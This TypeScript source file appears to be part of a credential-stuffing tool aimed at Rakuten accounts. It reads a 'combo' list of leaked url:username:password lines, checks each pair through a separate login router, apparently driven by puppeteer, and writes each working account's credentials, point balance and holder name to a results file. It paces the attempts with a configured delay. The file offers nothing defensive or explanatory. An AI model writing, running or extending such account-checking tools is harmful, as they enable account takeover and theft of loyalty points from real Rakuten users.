import { inputManager } from "../inputManager";
import {
  EnoguLike,
  LoggerLike,
  PointAndNameResult,
  RouterResult,
  config,
} from "../types";
import { AlphabetAndNumberValidator } from "./../validator/index";
import { loggerMessage } from "./../loggerMessage/index";
import * as puppeteer from "puppeteer";
import { wait } from "./../utils/wait";
import fs from "node:fs";
import { StandRakutenRouter } from "./StandRakutenRouter";

export class ComboRakutenRouter {
  constructor(
    private logger: LoggerLike,
    private enogu: EnoguLike,
    private loggerMessages: loggerMessage,
    private config: config,
  ) {}

  async start() {
    this.logger.info({}, "単体楽天垢 ポイントチェック");
    this.logger.info({}, "Crtl + C で終了");
    this.loggerMessages.blank();

    const comboFilePath = (
      await new inputManager(
        "Comboファイルのパスを入力してください: ",
      ).waitInput()
    ).trim();

    const resultFilePath = (
      await new inputManager("結果の出力パスを入力してください").waitInput()
    ).trim();

    if (
      /^(?:[a-zA-Z]:\\|(?:\\{2}[\w\d]+\\[\w.-]+))[^\\]*$/.test(
        resultFilePath,
      ) ||
      /^(?:\/[^\/]+)+$/.test(resultFilePath)
    ) {
      if (!fs.existsSync(resultFilePath)) {
        fs.writeFileSync(resultFilePath, "");
        this.logger.info(
          {},
          `ファイルが存在しなかった為、${resultFilePath} が新規作成されました。`,
        );
      }
    } else {
      this.logger.error({}, "正しいファイルパスを入力してください");
      return;
    }

    if (
      (/^(?:[a-zA-Z]:\\|(?:\\{2}[\w\d]+\\[\w.-]+))[^\\]*$/.test(
        comboFilePath,
      ) ||
        /^(?:\/[^\/]+)+$/.test(comboFilePath)) &&
      fs.existsSync(comboFilePath)
    ) {
      const content = fs.readFileSync(comboFilePath, "utf8").split("\n");
      const comboResult: {
        username: string;
        password: string;
      }[] = [];

      if (content.length > 10000) {
        this.logger.warn(
          {},
          "ファイルが大きすぎる為、処理に時間がかかる可能性が有ります。",
        );
      }

      for (let i = 0, len = content.length; i < len; i++) {
        const splitLine = content[i].split(":");
        const url = splitLine[0];
        if (!url.includes("rakuten")) {
          this.logger.warn({}, "形式が違うComboがスキップされました。");
        }

        splitLine.shift();
        const username = splitLine[0];
        splitLine.shift();
        const password = splitLine.join(":");
        comboResult.push({
          username,
          password,
        });
      }

      for (let i = 0, len = comboResult.length; i < len; i++) {
        this.logger.info(
          {},
          `(${i + 1}/${len}) ${comboResult[i].username}:${comboResult[i].password} の解析中・・・`,
        );
        new StandRakutenRouter(
          this.logger,
          this.enogu,
          this.loggerMessages,
          this.config,
        )
          .check(comboResult[i].username, comboResult[i].password)
          .then((result) => {
            this.logger.info(
              {},
              `(${i + 1}/${len}) ${comboResult[i].username}:${comboResult[i].password} の解析完了`,
            );
            this.logger.info(
              {},
              `(${i + 1}/${len}) ${comboResult[i].username}:${comboResult[i].password} ポイント: ${JSON.parse(result.message).point} ユーザー名: ${JSON.parse(result.message).name}`,
            );

            fs.appendFileSync(
              resultFilePath,
              `${comboResult[i].username}:${comboResult[i].password}:${JSON.parse(result.message).point}:${JSON.parse(result.message).name}\n`,
            );
          });

        await wait(this.config.values.interval);
      }
    } else {
      this.logger.error({}, "正しいファイルパスを入力してください");
      return;
    }
  }
}
